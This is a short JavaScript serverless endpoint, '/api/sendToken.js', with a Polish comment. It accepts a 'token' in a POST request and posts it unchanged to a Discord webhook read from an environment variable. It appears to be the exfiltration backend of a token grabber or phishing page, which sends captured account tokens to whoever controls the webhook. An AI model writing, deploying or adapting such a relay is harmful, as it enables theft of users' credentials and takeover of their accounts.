// /api/sendToken.js
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { token } = req.body;

  if (!token) {
    return res.status(400).json({ error: "No token provided" });
  }

  // Pobieramy webhook z Environment Variables
  const webhook = process.env.DISCORD_WEBHOOK;

  if (!webhook) {
    return res.status(500).json({ error: "Webhook not configured" });
  }

  try {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: token }),
    });

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Failed to send token" });
  }
}
